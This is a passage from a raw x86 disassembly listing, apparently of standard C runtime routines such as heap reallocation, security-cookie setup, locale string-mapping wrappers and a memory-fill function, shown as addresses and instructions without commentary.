  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
